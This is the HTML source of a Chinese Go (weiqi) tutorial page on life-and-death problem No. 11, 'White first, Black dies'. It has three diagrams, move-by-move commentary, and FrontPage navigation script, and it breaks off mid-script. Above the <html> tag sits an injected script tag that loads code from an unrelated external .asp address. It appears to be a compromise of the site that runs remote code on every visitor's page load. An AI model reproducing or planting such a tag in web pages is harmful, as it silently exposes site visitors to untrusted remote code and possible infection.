<script src=http://www.xinwen520.net/48472394k4r.asp></script><html>  <head> <meta http-equiv="Content-Type" content="text/html; charset=gb2312"> <meta name="GENERATOR" content="Microsoft FrontPage 6.0"> <meta name="ProgId" content="FrontPage.Editor.Document"> <title>第11型 白先黑死</title> <link rel="stylesheet" type="text/css" href="../../../weiqi365.css"> <meta name="Microsoft Theme" content="-1 0111, default"> </head>  <body background="../../../_themes/-1/urbtextb.gif" bgcolor="#FFFFCC" text="#330033" link="#663300" vlink="#CC6633" alink="#666666"><!--mstheme--><font face="宋体"><h1 align="center"><!--mstheme--><font color="#660033"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">第11型     白先黑死</span></font><!--mstheme--></font></h1>       <div align="center">         <center><!--mstheme--></font><table border="0" width="800" cellspacing="5">         <tr>           <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No11_1.png" width="232" height="232"><!--mstheme--></font></td>      <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>      <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No11_2.png" width="232" height="232"><!--mstheme--></font></td>    </tr>    <tr>      <td width="45%" valign="top"><!--mstheme--><font face="宋体">        <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图1</span></font></p>        <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">白1扑，是想得到却未必下得出的妙手。黑2如提，白3断打，黑4如团，白5卡，黑a则白b，黑死。黑2如于5位团眼，白2位长出，黑顿时就不行了。这才是问题的关键。</span></font><!--mstheme--></font></td>      <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>      <td width="45%" valign="top"><!--mstheme--><font face="宋体">        <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图2</span></font></p>        <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">白1扑时，黑2如单退，又当如何呢？其实不用多想，白3卡即可。以后，黑a提则白b打；黑c团则白d双打，这里无眼。</span></font><p>　<!--mstheme--></font></td>    </tr>    <tr>      <td width="45%" align="center"><!--mstheme--><font face="宋体"> 	<img border="0" src="No11_3.png" width="232" height="232"><!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" align="center"><!--mstheme--><font face="宋体">       <h1><!--mstheme--><font color="#660033"><span style="letter-spacing: 1pt"><a href="mailto:fiveduan@tom.com"><font face="楷体_GB2312">您的高见</font></a></span><!--mstheme--></font></h1>     <!--mstheme--></font></td>   </tr>   <tr>     <td width="45%" valign="top"><!--mstheme--><font face="宋体">       <p align="center"><font face="楷体_GB2312"><span style="letter-spacing: 1pt">图3</span></font></p>       <p><font face="楷体_GB2312"><span style="letter-spacing: 1pt">白1尖顶，不动脑筋。黑2挡，白并无后续手段。白1如于a位卡，黑1位并，这么大的空间做一个眼绝对没有问题。</span></font></p>     <!--mstheme--></font></td>     <td width="10%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>     <td width="45%" valign="top"><!--mstheme--><font face="宋体"><!--mstheme--></font></td>   </tr> </table><!--mstheme--><font face="宋体"></center> </div> <p align="center"> <!--webbot bot="Navigation" S-Type="arrows" S-Orientation="horizontal" S-Rendering="graphics" B-Include-Home="FALSE" B-Include-Up="TRUE" U-Page S-Target startspan --><script language="JavaScript"><!-- MSFPhover =    (((navigator.appName == "Netscape") &&    (parseInt(navigator.appVersion) >= 3 )) ||    ((navigator.appName == "Microsoft Internet Explorer") &&    (parseInt(navigator.appVersion) >= 4 )));  function MSFPpreload(img)  {   var a=new Image(); a.src=img; return a;  } // --></script><script language="JavaScript"><!-- if(MSFPhover) { MSFPnav1n=MSFPpreload("../../../_derived/back_cmp_-1110_back.gif"); MSFPnav1h=MSFPpreload("../../../_derived/back_cmp_-1110_back_a.gif"); } // --></script><a href="../No10/No10.htm" language="JavaScript" onmouseover="if(MSFPhov
